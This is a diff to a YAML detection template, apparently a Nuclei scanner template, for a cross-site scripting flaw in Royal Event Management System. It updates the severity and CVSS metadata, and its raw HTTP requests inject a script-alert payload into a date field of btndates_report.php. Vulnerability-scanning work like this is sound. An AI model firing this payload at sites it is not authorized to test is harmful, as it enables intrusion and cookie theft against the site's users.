@@ -1,18 +1,24 @@
 id: royalevent-management-xss
 
 info:
-  name: Royal Event - Cross-Site Scripting(XSS)
+  name: Royal Event Management System - Cross-Site Scripting
   author: ritikchaddha
-  severity: medium
+  severity: high
   description: |
-    Detects an XSS vulnerability in Royal Event System
+    Royal Event Management System contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
   reference:
     - https://www.sourcecodester.com/sites/default/files/download/oretnom23/Royal%20Event.zip
+    - https://packetstormsecurity.com/files/166479/Royale-Event-Management-System-1.0-Cross-Site-Scripting.html
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-80
   metadata:
     verified: true
-  tags: xss,authenticated,cms,royalevent
+    max-request: 2
+  tags: cms,royalevent,packetstorm,xss,authenticated,intrusive,vuln
 
-requests:
+http:
   - raw:
       - |
         POST /royal_event/ HTTP/1.1
@@ -31,9 +37,7 @@ requests:
         ------WebKitFormBoundaryCSxQll1eihcqgIgD
         Content-Disposition: form-data; name="login"
 
-
         ------WebKitFormBoundaryCSxQll1eihcqgIgD--
-
       - |
         POST /royal_event/btndates_report.php HTTP/1.1
         Host: {{Hostname}}
@@ -53,7 +57,6 @@ requests:
         2022-06-22<script>alert(document.domain)</script>
         ------WebKitFormBoundaryFboH5ITu7DsGIGrD--
 
-    cookie-reuse: true
     matchers-condition: and
     matchers:
       - type: word
@@ -70,3 +73,4 @@ requests:
       - type: status
         status:
           - 200
+# digest: 4a0a0047304502207949b51b674090ea7f58913df9eac54594b109d66f240e3e5e320e3e27e4bbf70221009b25e243cb74288630f4c3b02c166af5ded8eed9b9dc76fe0157865a9602ddb6:922c64590222798bb761d5b6d8e72950
